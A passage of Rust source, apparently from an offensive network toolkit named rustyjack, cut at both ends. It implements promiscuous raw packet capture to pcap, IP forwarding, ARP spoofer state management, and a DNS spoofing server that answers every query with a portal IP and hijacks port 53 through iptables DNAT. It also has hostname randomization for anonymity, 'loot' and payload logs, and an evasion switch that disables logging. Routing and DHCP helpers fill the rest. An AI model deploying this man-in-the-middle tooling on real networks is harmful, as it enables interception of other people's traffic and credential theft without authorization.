        PcapWriter::new(io::BufWriter::new(file), PCAP_SNAPLEN).context("writing pcap header")?;

    let stop = Arc::new(AtomicBool::new(false));
    let running = Arc::new(AtomicBool::new(true));
    let stop_thread = Arc::clone(&stop);
    let running_thread = Arc::clone(&running);
    let interface_name = interface.to_string();
    let path_display = path.display().to_string();

    let thread = std::thread::spawn(move || {
        if let Err(err) = run_pcap_capture(fd, writer, stop_thread, running_thread) {
            tracing::error!("[PCAP] capture failed on {}: {}", interface_name, err);
        }
        tracing::info!(
            "[PCAP] capture stopped on {} -> {}",
            interface_name,
            path_display
        );
    });

    let mut state = capture_state().lock().unwrap();
    *state = Some(CaptureHandle {
        stop,
        running,
        thread,
    });
    tracing::info!(
        "[PCAP] capture started on {} -> {}",
        interface,
        path.display()
    );
    Ok(())
}

struct PcapWriter<W: Write> {
    writer: W,
}

impl<W: Write> PcapWriter<W> {
    fn new(mut writer: W, snaplen: u32) -> io::Result<Self> {
        writer.write_all(&PCAP_MAGIC.to_le_bytes())?;
        writer.write_all(&PCAP_VERSION_MAJOR.to_le_bytes())?;
        writer.write_all(&PCAP_VERSION_MINOR.to_le_bytes())?;
        writer.write_all(&0i32.to_le_bytes())?;
        writer.write_all(&0u32.to_le_bytes())?;
        writer.write_all(&snaplen.to_le_bytes())?;
        writer.write_all(&PCAP_LINKTYPE_ETHERNET.to_le_bytes())?;
        Ok(Self { writer })
    }

    fn write_packet(&mut self, ts_sec: u32, ts_usec: u32, data: &[u8]) -> io::Result<()> {
        let len = data.len() as u32;
        self.writer.write_all(&ts_sec.to_le_bytes())?;
        self.writer.write_all(&ts_usec.to_le_bytes())?;
        self.writer.write_all(&len.to_le_bytes())?;
        self.writer.write_all(&len.to_le_bytes())?;
        self.writer.write_all(data)?;
        Ok(())
    }

    fn flush(&mut self) -> io::Result<()> {
        self.writer.flush()
    }
}

struct FdGuard(RawFd);

impl Drop for FdGuard {
    fn drop(&mut self) {
        unsafe {
            libc::close(self.0);
        }
    }
}

fn open_packet_socket(interface: &str) -> Result<RawFd> {
    let ifname = CString::new(interface).context("interface name contains null byte")?;
    let ifindex = unsafe { libc::if_nametoindex(ifname.as_ptr()) };
    if ifindex == 0 {
        return Err(anyhow!("failed to resolve ifindex for {}", interface));
    }

    let fd = unsafe {
        libc::socket(
            libc::AF_PACKET,
            libc::SOCK_RAW,
            (libc::ETH_P_ALL as u16).to_be() as i32,
        )
    };
    if fd < 0 {
        return Err(io::Error::last_os_error()).context("creating packet socket");
    }

    let sll = libc::sockaddr_ll {
        sll_family: libc::AF_PACKET as u16,
        sll_protocol: (libc::ETH_P_ALL as u16).to_be(),
        sll_ifindex: ifindex as i32,
        sll_hatype: 0,
        sll_pkttype: 0,
        sll_halen: 0,
        sll_addr: [0; 8],
    };
    let bind_res = unsafe {
        libc::bind(
            fd,
            &sll as *const libc::sockaddr_ll as *const libc::sockaddr,
            mem::size_of::<libc::sockaddr_ll>() as libc::socklen_t,
        )
    };
    if bind_res != 0 {
        let err = io::Error::last_os_error();
        unsafe { libc::close(fd) };
        return Err(err).context("binding packet socket");
    }

    if let Err(err) = set_promiscuous(fd, ifindex as i32) {
        tracing::warn!(
            "[PCAP] failed to set promiscuous mode on {}: {}",
            interface,
            err
        );
    }

    let flags = unsafe { libc::fcntl(fd, libc::F_GETFL) };
    if flags >= 0 {
        let _ = unsafe { libc::fcntl(fd, libc::F_SETFL, flags | libc::O_NONBLOCK) };
    }

    Ok(fd)
}

fn set_promiscuous(fd: RawFd, ifindex: i32) -> Result<()> {
    let mut mreq = libc::packet_mreq {
        mr_ifindex: ifindex,
        mr_type: libc::PACKET_MR_PROMISC as u16,
        mr_alen: 0,
        mr_address: [0; 8],
    };
    let res = unsafe {
        libc::setsockopt(
            fd,
            libc::SOL_PACKET,
            libc::PACKET_ADD_MEMBERSHIP,
            &mut mreq as *mut libc::packet_mreq as *mut libc::c_void,
            mem::size_of::<libc::packet_mreq>() as libc::socklen_t,
        )
    };
    if res != 0 {
        return Err(io::Error::last_os_error()).context("setting promiscuous mode");
    }
    Ok(())
}

fn run_pcap_capture(
    fd: RawFd,
    mut writer: PcapWriter<io::BufWriter<fs::File>>,
    stop: Arc<AtomicBool>,
    running: Arc<AtomicBool>,
) -> Result<()> {
    let _guard = FdGuard(fd);
    let mut buf = vec![0u8; PCAP_SNAPLEN as usize];
    let mut pollfd = libc::pollfd {
        fd,
        events: libc::POLLIN,
        revents: 0,
    };

    let result = (|| {
        while !stop.load(Ordering::Relaxed) {
            pollfd.revents = 0;
            let res = unsafe { libc::poll(&mut pollfd, 1, 500) };
            if res < 0 {
                let err = io::Error::last_os_error();
                if err.kind() == io::ErrorKind::Interrupted {
                    continue;
                }
                return Err(err).context("polling packet socket");
            }
            if res == 0 {
                continue;
            }
            if pollfd.revents & libc::POLLIN == 0 {
                continue;
            }

            let n = unsafe { libc::recv(fd, buf.as_mut_ptr() as *mut libc::c_void, buf.len(), 0) };
            if n < 0 {
                let err = io::Error::last_os_error();
                if err.kind() == io::ErrorKind::WouldBlock {
                    continue;
                }
                return Err(err).context("receiving packet");
            }

            let now = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default();
            let ts_sec = now.as_secs().min(u64::from(u32::MAX)) as u32;
            let ts_usec = now.subsec_micros();
            let size = n as usize;
            if size > 0 {
                writer
                    .write_packet(ts_sec, ts_usec, &buf[..size])
                    .context("writing pcap packet")?;
            }
        }

        writer.flush().context("flushing pcap writer")?;
        Ok(())
    })();

    running.store(false, Ordering::Relaxed);
    result
}

pub fn enable_ip_forwarding(enabled: bool) -> Result<()> {
    let value = if enabled { "1\n" } else { "0\n" };
    fs::write("/proc/sys/net/ipv4/ip_forward", value)
        .context("writing to /proc/sys/net/ipv4/ip_forward")?;
    Ok(())
}

struct DnsSpoofHandle {
    server: DnsServer,
    interface: String,
    listen_ip: Ipv4Addr,
}

struct ArpSpoofHandle {
    _interface: String,
    _target_ip: Ipv4Addr,
    _gateway_ip: Ipv4Addr,
    spoofers: Vec<ArpSpoofer>,
}

static ARP_SPOOFERS: OnceLock<Mutex<Vec<ArpSpoofHandle>>> = OnceLock::new();

fn arp_spoof_state() -> &'static Mutex<Vec<ArpSpoofHandle>> {
    ARP_SPOOFERS.get_or_init(|| Mutex::new(Vec::new()))
}

pub fn arp_spoof_running() -> bool {
    let mut state = arp_spoof_state().lock().unwrap();
    state.retain(|handle| handle.spoofers.iter().any(|s| s.is_running()));
    !state.is_empty()
}

pub fn stop_arp_spoof() -> Result<()> {
    let mut state = arp_spoof_state().lock().unwrap();
    for handle in state.drain(..) {
        for mut spoofer in handle.spoofers {
            spoofer.stop();
        }
    }
    Ok(())
}

static DNS_SPOOF: OnceLock<Mutex<Option<DnsSpoofHandle>>> = OnceLock::new();

fn dns_spoof_state() -> &'static Mutex<Option<DnsSpoofHandle>> {
    DNS_SPOOF.get_or_init(|| Mutex::new(None))
}

pub fn dns_spoof_running() -> bool {
    let mut state = dns_spoof_state().lock().unwrap();
    if let Some(handle) = state.as_ref() {
        if handle.server.is_running() {
            return true;
        }
    }
    if state.is_some() {
        let _ = state.take();
    }
    false
}

pub fn start_dns_spoof(interface: &str, listen_ip: Ipv4Addr, portal_ip: Ipv4Addr) -> Result<()> {
    let _ = stop_dns_spoof();
    let config = DnsConfig {
        interface: interface.to_string(),
        listen_ip,
        default_rule: DnsRule::WildcardSpoof(portal_ip),
        custom_rules: HashMap::new(),
        upstream_dns: None,
        log_queries: false,
    };

    let mut server = DnsServer::new(config)
        .with_context(|| format!("creating DNS spoof server on {}", interface))?;
    server
        .start()
        .with_context(|| format!("starting DNS spoof server on {}", interface))?;

    let ipt = IptablesManager::new().context("initializing netfilter for DNS spoof")?;
    let listen = listen_ip.to_string();
    if let Err(err) = ipt
        .add_dnat_udp(interface, 53, &listen, 53)
        .context("adding UDP DNS redirect")
        .and_then(|_| {
            ipt.add_dnat(interface, 53, &listen, 53)
                .context("adding TCP DNS redirect")
        })
    {
        let _ = server.stop();
        return Err(err);
    }

    let mut state = dns_spoof_state().lock().unwrap();
    *state = Some(DnsSpoofHandle {
        server,
        interface: interface.to_string(),
        listen_ip,
    });
    Ok(())
}

pub fn stop_dns_spoof() -> Result<()> {
    let handle = {
        let mut state = dns_spoof_state().lock().unwrap();
        state.take()
    };

    if let Some(mut handle) = handle {
        if let Ok(ipt) = IptablesManager::new() {
            let listen = handle.listen_ip.to_string();
            let _ = ipt.delete_dnat_udp(&handle.interface, 53, &listen, 53);
            let _ = ipt.delete_dnat(&handle.interface, 53, &listen, 53);
        }
        handle
            .server
            .stop()
            .with_context(|| format!("stopping DNS spoof on {}", handle.interface))?;
    }

    Ok(())
}

pub fn ping_host(host: &str, timeout: Duration) -> Result<bool> {
    #[cfg(target_os = "linux")]
    {
        let addr = resolve_ipv4(host)?;
        let timeout = timeout.clamp(Duration::from_secs(1), Duration::from_secs(30));

        struct FdGuard(RawFd);
        impl Drop for FdGuard {
            fn drop(&mut self) {
                unsafe {
                    libc::close(self.0);
                }
            }
        }

        let fd = unsafe { libc::socket(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_ICMP) };
        if fd < 0 {
            return Err(anyhow!(
                "Failed to open ICMP socket: {}",
                io::Error::last_os_error()
            ));
        }
        let _guard = FdGuard(fd);

        let tv = libc::timeval {
            tv_sec: timeout.as_secs() as libc::time_t,
            tv_usec: timeout.subsec_micros() as libc::suseconds_t,
        };
        unsafe {
            let _ = libc::setsockopt(
                fd,
                libc::SOL_SOCKET,
                libc::SO_RCVTIMEO,
                &tv as *const libc::timeval as *const libc::c_void,
                mem::size_of::<libc::timeval>() as libc::socklen_t,
            );
        }

        let ident = unsafe { libc::getpid() as u16 };
        let seq = 1u16;
        let mut packet = [0u8; 8 + 32];
        packet[0] = 8; // ICMP Echo Request
        packet[1] = 0; // code
        packet[4..6].copy_from_slice(&ident.to_be_bytes());
        packet[6..8].copy_from_slice(&seq.to_be_bytes());
        for (idx, byte) in packet[8..].iter_mut().enumerate() {
            *byte = (idx as u8).wrapping_add(0x42);
        }
        let checksum = icmp_checksum(&packet);
        packet[2..4].copy_from_slice(&checksum.to_be_bytes());

        let sockaddr = libc::sockaddr_in {
            sin_family: libc::AF_INET as libc::sa_family_t,
            sin_port: 0,
            sin_addr: libc::in_addr {
                s_addr: u32::from_be_bytes(addr.octets()),
            },
            sin_zero: [0; 8],
        };

        let sent = unsafe {
            libc::sendto(
                fd,
                packet.as_ptr() as *const libc::c_void,
                packet.len(),
                0,
                &sockaddr as *const libc::sockaddr_in as *const libc::sockaddr,
                mem::size_of::<libc::sockaddr_in>() as libc::socklen_t,
            )
        };
        if sent < 0 {
            return Err(anyhow!(
                "Failed to send ICMP echo to {host}: {}",
                io::Error::last_os_error()
            ));
        }

        let mut buf = [0u8; 1500];
        let mut from: libc::sockaddr_in = unsafe { mem::zeroed() };
        let mut from_len = mem::size_of::<libc::sockaddr_in>() as libc::socklen_t;
        let received = unsafe {
            libc::recvfrom(
                fd,
                buf.as_mut_ptr() as *mut libc::c_void,
                buf.len(),
                0,
                &mut from as *mut libc::sockaddr_in as *mut libc::sockaddr,
                &mut from_len,
            )
        };
        if received < 0 {
            let err = io::Error::last_os_error();
            if matches!(
                err.kind(),
                io::ErrorKind::WouldBlock | io::ErrorKind::TimedOut
            ) {
                return Ok(false);
            }
            return Err(anyhow!("ICMP receive failed: {}", err));
        }

        let received = received as usize;
        if received < 20 {
            return Ok(false);
        }

        let ip_header_len = ((buf[0] & 0x0f) as usize) * 4;
        if received < ip_header_len + 8 {
            return Ok(false);
        }

        let icmp = &buf[ip_header_len..];
        if icmp[0] != 0 || icmp[1] != 0 {
            return Ok(false);
        }
        let recv_id = u16::from_be_bytes([icmp[4], icmp[5]]);
        let recv_seq = u16::from_be_bytes([icmp[6], icmp[7]]);

        Ok(recv_id == ident && recv_seq == seq)
    }

    #[cfg(not(target_os = "linux"))]
    {
        let _ = host;
        let _ = timeout;
        bail!("ping_host is supported on Linux only")
    }
}

fn resolve_ipv4(host: &str) -> Result<Ipv4Addr> {
    if let Ok(addr) = host.parse::<Ipv4Addr>() {
        return Ok(addr);
    }
    let addrs = (host, 0)
        .to_socket_addrs()
        .with_context(|| format!("resolving host {host}"))?;
    for addr in addrs {
        if let IpAddr::V4(v4) = addr.ip() {
            return Ok(v4);
        }
    }
    bail!("No IPv4 address found for host {host}")
}

fn icmp_checksum(data: &[u8]) -> u16 {
    let mut sum = 0u32;
    let mut chunks = data.chunks_exact(2);
    for chunk in &mut chunks {
        let word = u16::from_be_bytes([chunk[0], chunk[1]]) as u32;
        sum = sum.wrapping_add(word);
    }
    if let Some(&last) = chunks.remainder().get(0) {
        sum = sum.wrapping_add((last as u32) << 8);
    }
    while (sum >> 16) != 0 {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    !(sum as u16)
}

pub fn read_dns_servers() -> Result<Vec<String>> {
    let resolv_path = resolve_root(None)
        .ok()
        .map(|root| root.join("resolv.conf"))
        .filter(|path| path.exists())
        .unwrap_or_else(|| PathBuf::from("/etc/resolv.conf"));
    let contents = fs::read_to_string(&resolv_path)
        .with_context(|| format!("reading {}", resolv_path.display()))?;
    let mut servers = Vec::new();
    for line in contents.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("nameserver") {
            let parts: Vec<&str> = trimmed.split_whitespace().collect();
            if let Some(server) = parts.get(1) {
                servers.push(server.to_string());
            }
        }
    }
    Ok(servers)
}

pub fn read_interface_stats(interface: &str) -> Result<InterfaceStats> {
    let base = PathBuf::from(format!("/sys/class/net/{interface}"));
    let rx = fs::read_to_string(base.join("statistics/rx_bytes"))
        .with_context(|| format!("reading rx_bytes for {interface}"))?
        .trim()
        .parse::<u64>()
        .unwrap_or(0);
    let tx = fs::read_to_string(base.join("statistics/tx_bytes"))
        .with_context(|| format!("reading tx_bytes for {interface}"))?
        .trim()
        .parse::<u64>()
        .unwrap_or(0);
    let oper_state = fs::read_to_string(base.join("operstate"))
        .unwrap_or_else(|_| "unknown".into())
        .trim()
        .to_string();

    Ok(InterfaceStats {
        rx_bytes: rx,
        tx_bytes: tx,
        oper_state,
    })
}

pub fn sanitize_label(label: &str) -> String {
    let mut safe = String::with_capacity(label.len());
    for ch in label.chars() {
        if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
            safe.push(ch);
        } else {
            safe.push('_');
        }
    }
    let trimmed = safe.trim_matches('_').to_string();
    if trimmed.is_empty() {
        "wired".to_string()
    } else {
        trimmed
    }
}

/// Randomize system hostname to a plausible, non-identifying value.
pub fn randomize_hostname() -> Result<String> {
    use std::process::id;

    let prefixes = ["android", "debian", "ubuntu", "raspi", "linux"];
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_else(|_| Duration::from_secs(0));
    let idx = (now.as_nanos() as usize + id() as usize) % prefixes.len();
    let suffix = format!("{:x}", now.as_nanos() ^ (id() as u128));
    let suffix_short = &suffix[..suffix.len().min(6)];
    let new_hostname = format!("{}-{}", prefixes[idx], suffix_short);

    #[cfg(target_os = "linux")]
    {
        let cstr = CString::new(new_hostname.clone())
            .map_err(|_| anyhow!("hostname contains interior null"))?;
        let rc = unsafe { libc::sethostname(cstr.as_ptr(), cstr.as_bytes().len()) };
        if rc != 0 {
            let err = std::io::Error::last_os_error();
            bail!("sethostname failed: {}", err);
        }
        let _ = fs::write("/etc/hostname", format!("{}\n", new_hostname));
        return Ok(new_hostname);
    }

    #[cfg(not(target_os = "linux"))]
    {
        bail!("hostname randomization supported on Linux only");
    }
}

pub fn current_mac(interface: &str) -> Option<String> {
    let path = PathBuf::from(format!("/sys/class/net/{interface}/address"));
    fs::read_to_string(path).ok().map(|s| s.trim().to_string())
}

pub fn log_mac_usage(root: &Path, interface: &str, context: &str, tag: Option<&str>) -> Result<()> {
    if rustyjack_evasion::logs_disabled() {
        return Ok(());
    }
    let mac = current_mac(interface).unwrap_or_else(|| "unknown".to_string());
    let log_dir = root.join("loot").join("reports");
    fs::create_dir_all(&log_dir).ok();
    let log_path = log_dir.join("mac_usage.log");
    let timestamp = Local::now().to_rfc3339();
    let record = json!({
        "ts": timestamp,
        "interface": interface,
        "mac": mac,
        "context": context,
        "tag": tag.unwrap_or("unknown"),
    });
    let mut file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_path)
        .with_context(|| format!("opening mac usage log at {}", log_path.display()))?;
    use std::io::Write;
    writeln!(file, "{}", record.to_string())
        .with_context(|| format!("writing mac usage log at {}", log_path.display()))?;
    Ok(())
}

pub fn append_payload_log(root: &Path, entry: &str) -> Result<()> {
    if rustyjack_evasion::logs_disabled() {
        return Ok(());
    }
    let path = root.join("loot").join("payload.log");
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).ok();
    }
    let mut file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .with_context(|| format!("opening payload log at {}", path.display()))?;
    use std::io::Write;
    writeln!(file, "{entry}")
        .with_context(|| format!("writing payload log at {}", path.display()))?;
    Ok(())
}

pub fn list_interface_summaries() -> Result<Vec<InterfaceSummary>> {
    let mut summaries = Vec::new();
    for entry in fs::read_dir("/sys/class/net").context("listing interfaces")? {
        let entry = entry?;
        let name = entry.file_name().to_string_lossy().to_string();
        let kind = if entry.path().join("wireless").exists() {
            "wireless".to_string()
        } else {
            "wired".to_string()
        };
        let oper_state = fs::read_to_string(entry.path().join("operstate"))
            .unwrap_or_else(|_| "unknown".into())
            .trim()
            .to_string();
        let flags_hex = fs::read_to_string(entry.path().join("flags")).unwrap_or_default();
        let flags = u32::from_str_radix(flags_hex.trim().trim_start_matches("0x"), 16)
            .or_else(|_| flags_hex.trim().parse::<u32>())
            .unwrap_or(0);
        let admin_up = (flags & 0x1) != 0;
        let carrier = fs::read_to_string(entry.path().join("carrier"))
            .ok()
            .and_then(|val| match val.trim() {
                "0" => Some(false),
                "1" => Some(true),
                _ => None,
            });
        let ip = match oper_state.as_str() {
            "down" | "dormant" | "lowerlayerdown" => None,
            _ => interface_ipv4(&name),
        };
        let is_wireless = kind == "wireless";
        summaries.push(InterfaceSummary {
            name,
            kind,
            oper_state,
            ip,
            is_wireless,
            admin_up,
            carrier,
            capabilities: None,
        });
    }
    Ok(summaries)
}

fn interface_ipv4(interface: &str) -> Option<String> {
    #[cfg(target_os = "linux")]
    {
        let addrs = netlink_get_ipv4_addresses(interface).ok()?;
        for addr in addrs {
            if let std::net::IpAddr::V4(v4) = addr.address {
                return Some(v4.to_string());
            }
        }
        None
    }
    #[cfg(not(target_os = "linux"))]
    {
        let _ = interface;
        None
    }
}

pub fn read_default_route() -> Result<Option<DefaultRouteInfo>> {
    let routes = netlink_list_routes().context("reading default route")?;
    let interfaces = netlink_list_interfaces().unwrap_or_default();
    let mut iface_map = std::collections::HashMap::new();
    for iface in interfaces {
        iface_map.insert(iface.index, iface.name);
    }

    let route = routes.into_iter().find(|route| {
        if route.prefix_len != 0 {
            return false;
        }
        match route.destination {
            None => true,
            Some(std::net::IpAddr::V4(v4)) => v4.octets() == [0, 0, 0, 0],
            _ => false,
        }
    });

    if let Some(route) = route {
        debug!(
            target: "net",
            iface_index = ?route.interface_index,
            gateway = ?route.gateway,
            metric = ?route.metric,
            "default_route"
        );
        Ok(Some(DefaultRouteInfo {
            interface: route
                .interface_index
                .and_then(|idx| iface_map.get(&idx).cloned()),
            gateway: route.gateway.and_then(|gw| match gw {
                std::net::IpAddr::V4(v4) => Some(v4),
                _ => None,
            }),
            metric: route.metric,
        }))
    } else {
        warn!(target: "net", "default_route_missing");
        Ok(None)
    }
}

pub fn interface_gateway(interface: &str) -> Result<Option<Ipv4Addr>> {
    let ifindex = match netlink_get_interface_index(interface) {
        Ok(idx) => idx,
        Err(err) => {
            warn!(
                target: "net",
                iface = %interface,
                error = %err,
                "ifindex_lookup_failed"
            );
            return Ok(None);
        }
    };
    let routes =
        netlink_list_routes().with_context(|| format!("querying routes for {interface}"))?;

    let is_default = |route: &crate::netlink_helpers::RouteInfo| {
        // A default route has no specific destination (0.0.0.0/0)
        match route.destination {
            None => true, // No destination = default route
            Some(IpAddr::V4(v4)) if v4.octets() == [0, 0, 0, 0] && route.prefix_len == 0 => true,
            _ => false,
        }
    };

    let find_gateway = |route: &crate::netlink_helpers::RouteInfo| -> Option<Ipv4Addr> {
        route.gateway.and_then(|gw| match gw {
            IpAddr::V4(v4) => Some(v4),
            _ => None,
        })
    };

    if let Some(route) = routes
        .iter()
        .find(|r| r.interface_index == Some(ifindex) && is_default(r))
    {
        if let Some(gateway) = find_gateway(route) {
            info!(
                target: "net",
                iface = %interface,
                gateway = %gateway,
                "gateway_detected"
            );
            return Ok(Some(gateway));
        }
    }

    if let Some(route) = routes
        .iter()
        .find(|r| r.interface_index == Some(ifindex) && r.gateway.is_some())
    {
        if let Some(gateway) = find_gateway(route) {
            info!(
                target: "net",
                iface = %interface,
                gateway = %gateway,
                "gateway_detected"
            );
            return Ok(Some(gateway));
        }
    }

    warn!(
        target: "net",
        iface = %interface,
        "gateway_missing"
    );
    Ok(None)
}

fn dhcp_transport_label(transport: DhcpTransport) -> String {
    match transport {
        DhcpTransport::Raw => "raw".to_string(),
        DhcpTransport::Udp => "udp".to_string(),
    }
}

#[tracing::instrument(target = "net", skip(hostname), fields(iface = %interface))]
fn dhcp_acquire_report(interface: &str, hostname: Option<&str>) -> Result<DhcpAttemptResult> {
    #[cfg(target_os = "linux")]
    {
        let report_result = match tokio::runtime::Handle::try_current() {
            Ok(handle) => handle.block_on(async {
                rustyjack_netlink::dhcp_acquire_report(interface, hostname).await
            }),
            Err(_) => {
                let rt = crate::runtime::shared_runtime()
                    .map_err(|e| anyhow!("Failed to use tokio runtime: {}", e))?;
                rt.block_on(async {
                    rustyjack_netlink::dhcp_acquire_report(interface, hostname).await
                })
            }
        };

        match report_result {
            Ok(report) => {
                let transport = Some(dhcp_transport_label(report.transport));
                if let Some(lease) = report.lease {
                    // Convert rustyjack_netlink::DhcpLease to OpsDhcpLease
                    let ops_lease = OpsDhcpLease {
                        ip: lease.address,
                        prefix_len: lease.prefix_len,
                        gateway: lease.gateway,
                        dns_servers: lease.dns_servers,
                    };
                    record_lease(interface, &ops_lease);
                    record_dhcp_outcome(interface, true, transport, Some(&ops_lease), None);
                    tracing::info!(
                        target: "net",
                        iface = %interface,
                        address = %ops_lease.ip,
                        prefix_len = ops_lease.prefix_len,
                        gateway = ?ops_lease.gateway,
                        "dhcp_lease_acquired"
                    );
                    Ok(DhcpAttemptResult::Lease(ops_lease))
                } else {
                    let error = report
                        .error
                        .unwrap_or_else(|| "DHCP failed without error detail".to_string());
                    record_dhcp_outcome(interface, false, transport, None, Some(error.clone()));
                    tracing::warn!(
                        target: "net",
                        iface = %interface,
                        error = %error,
                        "dhcp_acquire_failed"
                    );
                    Ok(DhcpAttemptResult::Failed(error))
                }
            }
            Err(err) => {
                record_dhcp_outcome(interface, false, None, None, Some(err.to_string()));
                tracing::warn!(
                    target: "net",
                    iface = %interface,
                    error = %err,
                    "dhcp_acquire_failed"
                );
                Ok(DhcpAttemptResult::Failed(err.to_string()))
            }
        }
    }
    #[cfg(not(target_os = "linux"))]
    {
        let _ = interface;
        let _ = hostname;
        Ok(DhcpAttemptResult::Failed(
            "DHCP acquire is only supported on Linux".to_string(),
        ))
    }
}

#[tracing::instrument(target = "net", fields(iface = %interface))]
pub fn acquire_dhcp_lease(interface: &str) -> Result<DhcpAttemptResult> {
    let _guard = lock_interface(interface);
    dhcp_acquire_report(interface, None)
}

#[tracing::instrument(target = "net", fields(iface = %interface))]
pub fn try_acquire_dhcp_lease(interface: &str) -> Result<DhcpAttemptResult> {
    let _guard = match try_lock_interface(interface) {
        Some(guard) => guard,
        None => {
            tracing::debug!(
                target: "net",
                iface = %interface,
                "dhcp_acquire_skipped_lock_busy"
            );
            return Ok(DhcpAttemptResult::Busy);
        }
    };
    dhcp_acquire_report(interface, None)
}

fn interface_exists(interface: &str) -> bool {
    if interface.is_empty() {
        return false;
    }
    Path::new("/sys/class/net").join(interface).exists()
}

fn fallback_preferred_interface() -> Option<String> {
    for name in ["eth0", "wlan0", "wlan1"] {
        if interface_exists(name) {
            return Some(name.to_string());
        }
    }

    let entries = fs::read_dir("/sys/class/net").ok()?;
    for entry in entries.flatten() {
        let iface = entry.file_name().to_string_lossy().to_string();
        if iface != "lo" {
            return Some(iface);
        }
    }
    None
}

pub fn preferred_interface() -> Result<String> {
    let root = resolve_root(None)?;
    let current = read_interface_preference(&root, "system_preferred")?;
    let preferred = match current.as_deref() {
        Some(name) if interface_exists(name) => name.to_string(),
        _ => fallback_preferred_interface()
            .ok_or_else(|| anyhow!("No network interfaces available"))?,
    };

    if current.as_deref() != Some(preferred.as_str()) {
        let _ = write_interface_preference(&root, "system_preferred", &preferred);
    }

    Ok(preferred)
}

pub fn route_interface() -> Result<String> {
    let preferred = preferred_interface()?;
    let (route_iface, _allowed) = isolation_plan(&preferred);
    Ok(route_iface)
}

fn isolation_plan(preferred: &str) -> (String, Vec<String>) {
    if let Some(state) = status_hotspot() {
        let upstream = state.upstream_interface;
        let ap = state.ap_interface;
        let mut allowed = Vec::new();
        if !ap.is_empty() {
            allowed.push(ap.clone());
        }
        if !upstream.is_empty() {
            allowed.push(upstream.clone());
        }
        if allowed.is_empty() {
            return (preferred.to_string(), vec![preferred.to_string()]);
        }
        allowed.sort();
        allowed.dedup();
        let route_interface = if !upstream.is_empty() && interface_exists(&upstream) {
            upstream
        } else if !ap.is_empty() {
            ap.clone()
        } else {
            preferred.to_string()
        };
        return (route_interface, allowed);
    }

    (preferred.to_string(), vec![preferred.to_string()])
}

fn interface_has_carrier(interface: &str) -> bool {
    if interface.is_empty() {
        return false;
    }
    let carrier_path = format!("/sys/class/net/{}/carrier", interface);
    match fs::read_to_string(&carrier_path) {
        Ok(val) => val.trim() == "1",
        Err(_) => false,
    }
}

fn interface_has_ipv4(interface: &str) -> bool {
    if interface.is_empty() {
        return false;
    }
    #[cfg(target_os = "linux")]
    {
        let addrs = netlink_get_ipv4_addresses(interface).unwrap_or_default();
        addrs
            .iter()
            .any(|addr| matches!(addr.address, std::net::IpAddr::V4(_)))
    }
    #[cfg(not(target_os = "linux"))]
    {
        let _ = interface;
        false
    }
}

#[cfg(target_os = "linux")]
fn wifi_ready(interface: &str) -> bool {
    interface_has_carrier(interface) || interface_has_ipv4(interface)
}

#[cfg(not(target_os = "linux"))]
fn wifi_ready(_interface: &str) -> bool {
    false
}

fn candidate_gateway(interface: &str) -> Option<Ipv4Addr> {
    cached_gateway(interface).or_else(|| interface_gateway(interface).ok().flatten())
}

struct UplinkCandidate {
    interface: String,
    gateway: Ipv4Addr,
    dns_servers: Vec<Ipv4Addr>,
    metric: u32,
}

fn evaluate_uplink(interface: &str, kind: &str, metric: u32) -> Option<UplinkCandidate> {
    if !interface_exists(interface) {
        return None;
    }

    let link_ready = match kind {
        "wired" => interface_has_carrier(interface),
        "wireless" => wifi_ready(interface),
        _ => false,
    };

    if !link_ready || !interface_has_ipv4(interface) {
        return None;
    }

    let gateway = candidate_gateway(interface)?;
    let dns_servers = cached_dns(interface);

    Some(UplinkCandidate {
        interface: interface.to_string(),
        gateway,
        dns_servers,
        metric,
    })
}

pub fn select_active_uplink() -> Result<Option<String>> {
    let _guard = lock_uplink();

    let preferred = preferred_interface()?;
    let (route_iface, allowed) = isolation_plan(&preferred);
    apply_interface_isolation(&allowed)?;
    let kind = if is_wireless_interface(&route_iface) {
        "wireless"
    } else {
        "wired"
    };
    let metric = if kind == "wireless" {
        WLAN_METRIC
    } else {
        ETH_METRIC
    };
    let selected = evaluate_uplink(&route_iface, kind, metric);

    match selected {
        Some(candidate) => {
            set_default_route_with_metric(
                &candidate.interface,
                candidate.gateway,
                Some(candidate.metric),
            )?;
            let _ = rewrite_dns_servers(&candidate.interface, &candidate.dns_servers);
            set_active_uplink(Some(candidate.interface.clone()));
            Ok(Some(candidate.interface))
        }
        None => {
            let _ = netlink_delete_default_route();
            set_active_uplink(None);
            Ok(None)
        }
    }
}

pub fn ensure_route_no_isolation(interface: &str) -> Result<Option<Ipv4Addr>> {
    if interface.trim().is_empty() {
        bail!("interface cannot be empty");
    }

    #[cfg(target_os = "linux")]
    {
        let iface_path = Path::new("/sys/class/net").join(interface);
        if !iface_path.exists() {
            bail!("interface {} not found", interface);
        }
        let _ = netlink_set_interface_up(interface);
        let oper_state = fs::read_to_string(iface_path.join("operstate"))
            .unwrap_or_else(|_| "unknown".to_string())
            .trim()
            .to_string();
        let carrier = fs::read_to_string(iface_path.join("carrier"))
            .unwrap_or_else(|_| "unknown".to_string())
            .trim()
            .to_string();
        let ipv4_addrs = netlink_get_ipv4_addresses(interface)
            .unwrap_or_default()
            .iter()
            .filter_map(|addr| match addr.address {
                std::net::IpAddr::V4(v4) => Some(v4.to_string()),
                _ => None,
            })
            .collect::<Vec<_>>();
        tracing::info!(
            target: "net",
            iface = %interface,
            operstate = %oper_state,
            carrier = %carrier,
            ipv4 = ?ipv4_addrs,
            "route_no_isolation_snapshot"
        );
    }

    let mut gateway = candidate_gateway(interface);
    if gateway.is_none() {
        tracing::info!(
            target: "net",
            iface = %interface,
            "gateway_missing_dhcp_attempt"
        );
        gateway = dhcp_acquire_gateway(interface)?;
    }

    if let Some(gateway) = gateway {
        let _ = select_active_uplink();
        return Ok(Some(gateway));
    }

    tracing::warn!(
        target: "net",
        iface = %interface,
        "gateway_missing_after_dhcp"
    );
    let _ = select_active_uplink();
    Ok(None)
}

fn dhcp_acquire_gateway(interface: &str) -> Result<Option<Ipv4Addr>> {
    match acquire_dhcp_lease(interface)? {
